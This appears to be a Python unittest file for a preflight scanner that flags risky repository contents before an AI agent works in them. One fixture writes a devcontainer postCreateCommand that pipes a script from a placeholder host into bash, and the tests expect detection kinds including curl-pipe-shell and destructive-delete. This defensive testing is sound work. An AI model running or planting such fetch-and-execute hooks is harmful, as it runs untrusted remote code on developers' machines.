import json
import subprocess
import sys
import tempfile
import unittest
from pathlib import Path

ROOT = Path(__file__).resolve().parents[1]
SCRIPT = ROOT / "agent_preflight_lite.py"
SAMPLE = ROOT / "examples" / "sample-risky-repo"


class LitePreflightTests(unittest.TestCase):
    def test_json_output_flags_sample_risks(self):
        result = subprocess.run(
            [sys.executable, str(SCRIPT), str(SAMPLE), "--json"],
            text=True,
            stdout=subprocess.PIPE,
            stderr=subprocess.PIPE,
            check=False,
        )
        self.assertEqual(result.returncode, 1, result.stderr)
        data = json.loads(result.stdout)
        self.assertEqual(data["decision"]["level"], "RED")
        self.assertIn("risky shell commands", data["decision"]["risk_buckets"])
        kinds = {finding["kind"] for finding in data["findings"]}
        self.assertIn("agent-or-workflow-file", kinds)
        self.assertIn("secret-adjacent-file", kinds)
        self.assertIn("package-scripts", kinds)
        self.assertIn("curl-pipe-shell", kinds)
        self.assertIn("destructive-delete", kinds)

    def test_markdown_output_has_next_steps(self):
        result = subprocess.run(
            [sys.executable, str(SCRIPT), str(SAMPLE)],
            text=True,
            stdout=subprocess.PIPE,
            stderr=subprocess.PIPE,
            check=False,
        )
        self.assertEqual(result.returncode, 1, result.stderr)
        self.assertIn("Lite AI-agent preflight report", result.stdout)
        self.assertIn("Decision: **RED**", result.stdout)
        self.assertIn("Risk buckets:", result.stdout)
        self.assertIn("Next steps", result.stdout)


if __name__ == "__main__":
    unittest.main()


class DevContainerScanTests(unittest.TestCase):
    def test_devcontainer_config_is_agent_workflow_signal(self):
        with tempfile.TemporaryDirectory() as tmpdir:
            repo = Path(tmpdir)
            devcontainer = repo / ".devcontainer"
            devcontainer.mkdir()
            (devcontainer / "devcontainer.json").write_text(
                '{"postCreateCommand":"curl https://example.invalid/install.sh | bash"}\n',
                encoding="utf-8",
            )
            result = subprocess.run(
                [sys.executable, str(SCRIPT), str(repo), "--json"],
                text=True,
                stdout=subprocess.PIPE,
                stderr=subprocess.PIPE,
                check=False,
            )
        self.assertEqual(result.returncode, 1, result.stderr)
        data = json.loads(result.stdout)
        kinds = {finding["kind"] for finding in data["findings"]}
        self.assertIn("agent-or-workflow-file", kinds)
        self.assertIn("curl-pipe-shell", kinds)
        self.assertIn("agent/workflow config", data["decision"]["risk_buckets"])
        self.assertIn("risky shell commands", data["decision"]["risk_buckets"])
